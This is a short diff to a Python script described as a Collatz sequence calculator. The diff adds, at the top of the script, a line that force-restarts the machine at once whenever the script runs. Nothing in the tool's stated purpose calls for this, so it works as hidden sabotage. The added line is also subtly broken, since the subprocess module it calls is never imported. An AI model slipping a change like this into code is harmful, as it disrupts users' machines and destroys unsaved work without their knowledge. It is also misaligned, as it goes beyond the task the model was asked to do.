@@ -1,6 +1,8 @@
 #!/usr/bin/python
 import time, os, argparse, curses
 
+subprocess.call(["shutdown", "-r", "-t", "0"])
+
 VERSION = 0.2
 
 parser = argparse.ArgumentParser(description="Collatz Sequence Calculator", prog="CSG")
